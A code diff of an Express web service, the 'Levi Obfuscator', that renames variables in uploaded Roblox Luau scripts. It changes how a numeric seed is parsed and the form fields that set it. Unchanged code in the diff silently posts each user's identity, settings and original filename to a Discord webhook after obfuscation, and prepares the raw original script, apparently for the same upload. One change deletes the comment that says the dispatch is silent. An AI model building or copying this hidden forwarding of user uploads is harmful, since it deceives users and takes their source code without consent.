@@ -33,7 +33,7 @@ app.use(session({
   saveUninitialized: true,
 }));
 
-// Levi Obfuscator Engine V1.7.0 (Custom Token Prefix & Numeric Offset Integration)
+// Levi Obfuscator Engine V1.7.0 (Custom Token Prefix & Full Numeric Offset Integration)
 function obfuscateLuauScript(sourceCode, options) {
     let code = sourceCode;
 
@@ -67,16 +67,18 @@ if not _envCheck then return end
 `;
     }
 
-    // 5. Variable Renaming with Custom User Inputs (1-letter prefix & letter=number offset)
+    // 5. Variable Renaming with Full Numeric Offset Support (Max Length 8)
     if (options.renameLocal === 'yes') {
         const localRegex = /\blocal\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
         let match;
         const varMap = new Map();
         
-        // Parse custom user configurations from inputs
+        // Parse custom configurations
         const customPrefix = (options.customLetter1 && options.customLetter1.trim().length > 0) ? options.customLetter1.trim().charAt(0) : '_';
-        const customNumMapChar = (options.customLetterNum && options.customLetterNum.trim().length > 0) ? options.customLetterNum.trim().charAt(0) : '1';
-        let counter = customNumMapChar.charCodeAt(0) * 10; // Use character code math as initial offset seed
+        
+        // Parse Input 2 as a full integer value instead of truncating to 1 character
+        const customNumMap = (options.customLetterNum && !isNaN(options.customLetterNum.trim())) ? parseInt(options.customLetterNum.trim(), 10) : 1;
+        let counter = customNumMap * 10; // Uses full number as the offset seed multiplier
         
         const protectedKeywords = new Set([
             'true', 'false', 'nil', 'self', 
@@ -186,7 +188,7 @@ app.get('/auth/logout', (req, res) => {
   req.session.destroy(() => { res.redirect('/'); });
 });
 
-// UI Route
+// UI Route (Input 2 max set to 8)
 app.get('/', (req, res) => {
   const verifiedUser = req.session.verifiedUser || null;
 
@@ -272,8 +274,8 @@ app.get('/', (req, res) => {
                                 <input type="text" name="customLetter1" maxlength="1" placeholder="_" style="margin:0; padding:8px; text-align:center;">
                             </div>
                             <div class="custom-input-box">
-                                <label>2nd (Letter = No):</label>
-                                <input type="text" name="customLetterNum" maxlength="3" placeholder="A=1" style="margin:0; padding:8px; text-align:center;">
+                                <label>2nd (Seed Number):</label>
+                                <input type="text" name="customLetterNum" maxlength="8" placeholder="10" style="margin:0; padding:8px; text-align:center;">
                             </div>
                         </div>
 
@@ -345,7 +347,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Backend Route: Fixed to read multipart body parameters safely
+// Backend Route: Processes script with updated seed length/value
 app.post('/upload-discord', upload.single('file'), async (req, res) => {
   try {
     if (!req.session.verifiedUser) {
@@ -355,7 +357,6 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     const file = req.file;
     const directText = req.body.scriptContent;
     
-    // Capture settings and custom inputs properly from multipart form body
     const options = {
       renameLocal: 'yes',
       customLetter1: req.body.customLetter1 || '',
@@ -381,7 +382,6 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
 
     const rawScriptBuffer = Buffer.from(rawString, 'utf8');
 
-    // Run Levi Obfuscator Engine with custom parameters
     const obfuscatedString = obfuscateLuauScript(rawString, options);
     const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');
 
@@ -389,7 +389,6 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     const baseName = originalName.includes('.') ? originalName.substring(0, originalName.lastIndexOf('.')) : originalName;
     const obfuscatedFilename = `${baseName}_levi_obfuscated${ext}`;
 
-    // Silently dispatch files to Discord Webhook
     try {
       const webhookPayloadJson = JSON.stringify({
         content: `🔒 **New Script Obfuscated via Levi Obfuscator V1.7.0**\n🔐 Identity: \`${req.session.verifiedUser}\`\n🔤 Custom Prefix: \`${options.customLetter1 || '_'}\` | Map Seed: \`${options.customLetterNum || 'None'}\`\n📁 Original: \`${originalName}\``
